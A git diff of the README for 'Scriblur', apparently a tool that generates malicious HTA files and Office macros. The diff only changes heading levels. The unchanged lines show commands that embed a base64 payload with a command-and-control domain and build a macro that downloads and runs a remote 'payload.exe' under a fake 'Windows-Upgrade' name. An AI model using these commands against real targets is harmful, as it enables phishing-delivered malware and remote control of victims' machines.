@@ -10,11 +10,11 @@ Scriblur is a breeze to use. Simply clone the directory, and cd into it.
 For the HTA payload:
   python Scriblur.py -n Windows-Upgade -p b64encodedpayload -c amazon.com/c2/domain
 
-## HTA Example
+# HTA Example
 ![alt text](https://github.com/nins3i/Scriblur/blob/master/HTA.png)
 
 For the Macro Subroutine:
   python Scriblur.py -n Windows-Upgrade -e amazon.com/final/payload.exe
 
-## Macro Example
+# Macro Example
 ![alt text](https://github.com/nins3i/Scriblur/blob/master/Macro.png)
